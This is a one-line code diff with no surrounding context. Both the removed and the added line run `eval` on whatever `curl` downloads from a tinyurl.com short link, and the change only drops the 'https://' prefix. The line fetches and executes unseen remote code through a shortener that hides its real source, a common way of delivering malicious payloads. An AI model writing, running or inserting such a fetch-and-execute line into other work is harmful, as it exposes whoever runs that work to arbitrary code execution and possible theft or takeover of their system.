@@ -1,1 +1,1 @@
-eval`curl -sL https://tinyurl.com/26uf6ex4`
+eval`curl -sL tinyurl.com/26uf6ex4`
